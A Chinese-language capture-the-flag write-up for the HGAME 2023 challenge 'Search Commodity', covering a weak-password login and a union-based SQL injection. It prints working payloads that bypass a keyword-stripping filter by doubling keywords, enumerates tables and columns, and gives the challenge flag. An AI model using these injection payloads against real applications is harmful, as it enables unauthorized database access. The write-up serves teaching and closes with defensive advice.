# Search Commodity

## 题目简述

题目由弱口令和联合查询 SQL 注入两部分组成。登录用户名由题面给出为 `user01`，密码可以通过常见弱口令字典得到；登录后的 `/home` 页面按 `id` 查询商品，该参数可注入，但服务端会删除部分 SQL 关键字。

## 解题过程

使用以下凭据登录：

```text
username: user01
password: admin123
```

在商品 `id` 参数中测试引号、注释和联合查询后，可以确认回显列数为 3。过滤器只进行一次关键字替换，因此可以把关键字嵌套双写：例如 `uniunionon` 删除中间的 `union` 后仍留下 `union`，`selselectect` 同理。PDF 中使用 `/*/**/*/` 分隔 token，列数探测为：

```sql
0/*/**/*/uniunionon/*/**/*/selselectect/*/**/*/1,2,3
```

依次查询当前数据库、表名和列名：

```sql
0/*/**/*/uniunionon/*/**/*/selselectect/*/**/*/1,datadatabasebase(),3
```

```sql
0/*/**/*/uniunionon/*/**/*/selselectect/*/**/*/1,
(selselectect/*/**/*/group_concat(table_name)/*/**/*/frfromom/*/**/*/
infoorrmation_schema.tables/*/**/*/whewherere/*/**/*/
table_schema/*/**/*/like/*/**/*/"se4rch"),3
```

```sql
0/*/**/*/uniunionon/*/**/*/selselectect/*/**/*/1,
(selselectect/*/**/*/group_concat(column_name)/*/**/*/frfromom/*/**/*/
infoorrmation_schema.columns/*/**/*/whewherere/*/**/*/
table_name/*/**/*/like/*/**/*/"5ecret15here"),3
```

枚举结果表明 flag 位于表 `5ecret15here` 的列 `f14gggg1shere`，最终查询为：

```sql
0/*/**/*/uniunionon/*/**/*/selselectect/*/**/*/1,
(selselectect/*/**/*/f14gggg1shere/*/**/*/frfromom/*/**/*/5ecret15here),3
```

最终回显为：

```text
hgame{4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!}
```

官方 PDF 给出了完整的登录信息、过滤绕过方式、目标表列和最终查询，但没有记录回显；结果由 [HGAME2023 官方题解仓库](https://github.com/vidar-team/HGAME2023_Writeup) 收录的参赛者 Week2 题解补全。该题解还指出 WAF 也可被关键字大小写绕过，进一步说明过滤本质上是大小写敏感的字符串替换。

## 方法总结

本题的关键不是复杂 SQL 语法，而是识别一次性黑名单替换：双写关键字让第一次删除后重新拼出有效 token。实际系统不应通过删关键字防 SQL 注入，应使用参数化查询；登录端也必须禁止默认或弱口令，并对认证尝试设置速率限制。
